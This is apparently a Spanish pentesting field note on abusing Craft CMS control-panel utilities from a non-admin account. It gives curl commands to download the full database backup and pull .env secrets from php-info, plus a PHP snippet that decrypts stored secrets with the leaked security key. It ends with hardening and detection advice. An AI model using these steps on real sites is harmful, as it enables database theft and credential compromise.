---
topic: craft-cms
platform: Web
tags: [craftcms, yii2, php, secrets, web, privesc]
---

# Craft CMS — utilidades del panel y secretos del entorno

[🇬🇧 English](craft-cms-cp-utilities.en.md) | **Español**

> Cuando ya tienes sesión en el control panel pero **no** eres administrador: qué mirar antes de perder horas con un RCE que no aplica.

## 1. Confirmar el rol real (no el que dice el writeup)

Craft inyecta su configuración en el HTML del CP. Búscala antes de asumir privilegios:

```bash
curl -s -b cj http://<host>/admin/dashboard -o dash.html
grep -o '"userIsAdmin":[a-z]*' dash.html
grep -o '"publishableSections":\[[^]]*\]' dash.html
grep -o '"editableCategoryGroups":\[[^]]*\]' dash.html
grep -o '"canAccessQueueManager":[a-z]*' dash.html
```

Si `userIsAdmin` es `false` y las secciones/assets están vacíos, olvida publicar contenido: el interés está en lo que el modelo de permisos **no** cerró.

## 2. Enumerar utilidades

```bash
for u in db-backup php-info system-report clear-caches updates queue-manager find-replace migrations; do
  printf '%-14s => ' "$u"
  curl -s -b cj -o /dev/null -w '%{http_code} %{size_download}\n' "http://<host>/admin/utilities/$u"
done
```

`200` con un tamaño grande = página real (no un redirect al login). Es habitual encontrar `db-backup` y `php-info` accesibles cuando el rol se definió copiando permisos "de conveniencia".

## 3. Descargar la base de datos entera

La utilidad no hace falta "explotarla": el formulario legítimo ya devuelve el dump si se pide `downloadBackup`.

```bash
# 1) token CSRF del propio CP
CSRF=$(sed -n 's/.*"csrfTokenValue":"\([^"]*\)".*/\1/p' db.html | head -1)

# 2) POST a la acción de la utilidad
curl -s -b cj -c cj -o backup.zip \
  -H "X-CSRF-Token: $CSRF" -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Accept: application/json' \
  --data-urlencode "CRAFT_CSRF_TOKEN=$CSRF" \
  --data-urlencode 'downloadBackup=1' \
  'http://<host>/index.php?p=admin/actions/utilities/db-backup-perform-action'

file backup.zip     # Zip archive -> <site>--<fecha>--v<version>.sql
```

Si no hay `unzip` en el host:

```bash
python3 -c "import zipfile;zipfile.ZipFile('backup.zip').extractall('dbdump')"
```

## 4. `php-info` = `.env` en texto claro

Craft carga `.env` con Dotenv y `phpinfo()` publica la sección "Environment":

```bash
curl -s -b cj http://<host>/admin/utilities/php-info -o php.html
grep -oE 'CRAFT_[A-Z_]+' php.html | sort -u
```

Suele salir `CRAFT_SECURITY_KEY`, `CRAFT_DB_USER`, `CRAFT_DB_PASSWORD`, `CRAFT_DB_DATABASE`, `CRAFT_DEV_MODE`, `CRAFT_ENABLE_TWIG_SANDBOX`. El parser importa: en phpinfo cada valor va en su propio `<td>`, así que hay que tomar el siguiente `<td>` tras el nombre.

## 5. Descifrar secretos guardados en la base de datos

Craft/Yii cifran valores con la clave de seguridad. El blob tiene el formato de `yii\base\Security::encryptByKey()`:

```text
[keySalt (keySize bytes)] [MAC hex de 64 caracteres] [IV (16)] [ciphertext AES-CBC]
```

Con acceso al árbol `vendor/` del proyecto (o replicando el algoritmo fuera):

```php
require 'vendor/autoload.php';

$security = new yii\base\Security();              // cipher por defecto: AES-128-CBC
echo $security->decryptByKey(base64_decode($argv[1]), $argv[2]), PHP_EOL;
```

```bash
php dec.php '<blob_base64>' '<CRAFT_SECURITY_KEY>'
```

Notas de campo:

- `keySize` depende del cifrado: 16 para AES-128-CBC (el valor por defecto), 32 para AES-256-CBC. Eso decide dónde empieza el MAC.
- El MAC es **hex**, no binario, porque `hashData()` se llama con `$rawHash = false`. Eso explica los 64 caracteres ASCII dentro de un blob que por lo demás es binario.
- Si el MAC no cuadra en una reimplementación propia, no insistas a ciegas: prueba el valor en el servicio real o consigue ejecución de PHP en el host. Un descifrado "que parece bien" pero no autentica no es una prueba.
- Rotar la clave invalida los blobs anteriores: si no descifra, puede que el valor se cifrara con otra clave.

## 6. Dónde suele estar el siguiente salto

```bash
grep -rIl "password\|secret\|encrypt\|decryptByKey" /var/www/<app>/modules /var/www/<app>/src 2>/dev/null
```

Los módulos a medida son los que guardan credenciales de servicios (SMTP, APIs, relays) en tablas propias y las descifran con la misma clave. Ahí es donde aparece la reutilización de contraseña.

## 7. Hardening

| Medida | Por qué |
|---|---|
| Permisos reales en `utilities/*` | Un editor no debe generar ni descargar backups |
| Desactivar la utilidad `php-info` en producción | No hay motivo para exponer el entorno |
| `expose_php = Off` y sin `phpinfo()` accesible | Elimina la fuga del `.env` |
| Clave de seguridad fuera del alcance del usuario web | Rompe la separación clave/cifrado |
| Rotar claves tras una filtración | Los blobs viejos dejan de ser útiles |
| No reutilizar contraseñas de servicio como contraseñas de sistema | Convierte una fuga de aplicación en acceso al host |
| Backups cifrados y con purga automática | Reduce el impacto si se descargan |

## 8. Detección

- POST a `admin/actions/utilities/db-backup-perform-action` desde cuentas no administrativas.
- GET a `utilities/php-info` en producción (debería ser inexistente).
- Descargas de backups fuera de la ventana de mantenimiento.
- Accesos a `vendor/` o ejecuciones de PHP desde rutas temporales en el host web.

## Referencias

- Craft CMS — Configuration and `.env`: <https://craftcms.com/docs/5.x/configure.html>
- Yii2 `yii\base\Security` (`encryptByKey`, `decryptByKey`, `hkdf`)
- Avisos de seguridad de Craft CMS: <https://craftcms.com/knowledge-base/security> (los identificadores CVE de la familia `element-search` no se pudieron verificar; no se citan).
